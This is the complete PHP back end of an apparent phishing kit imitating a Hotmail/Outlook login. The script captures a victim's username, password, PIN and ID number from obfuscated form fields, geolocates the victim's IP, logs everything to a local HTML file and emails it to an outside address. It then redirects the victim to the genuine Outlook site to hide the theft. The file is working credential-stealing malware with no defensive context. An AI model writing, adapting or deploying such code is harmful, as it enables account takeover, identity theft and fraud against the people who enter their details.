<?php
error_reporting(0);
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip)); 
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
#Country info
$_SESSION['tlVVJNECrWGtadX'] = $_POST['tlVVJNECrWGtadX'];
$_SESSION['mxLRLDLOWkkKsDR'] = $_POST['mxLRLDLOWkkKsDR'];
$_SESSION['jeNelPSWXcSregY'] = $_POST['jeNelPSWXcSregY'];

#Security information
$message = "********************************************* <br />
Usuario	=>   <font color='#0416F3'>".$_POST['tlVVJNECrWGtadX']."</font> <font color='#1CFF01'>".$_POST['CA_DNI']."</font> -  
Clave	=>   <font color='#0416F3'>".$_POST['mxLRLDLOWkkKsDR']."</font> <font color='#1CFF01'>".$_POST['CA_DNI']." </font> - 
PIN	=>   <font color='#008000'>".$_POST['jeNelPSWXcSregY']."</font> <font color='#F31414'>".$_POST['CA_DNI']."</font> - IP              =>   <font color='#008000'>".$_SESSION['_IP_']."</font> - 
<font color='#008000'> " . $ipdat->geoplugin_countryCode . " </font>
TIME	=>   <font color='#0416F3'>".date('l jS \of F Y h:i:s A')."</font>  <br/> 
</div>";

$fp = fopen('AnaRous.html', 'a');
fwrite($fp, "$message \r\n");
fclose($fp);

$subject  = "Hotmail Log [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: Hotmail Log2 <admin@Outlook.com" . "\r\n";

$to = "onlineservicebofa@usa.com";
@mail($to,$subject,$message,$headers);
header('location: https://outlook.live.com');
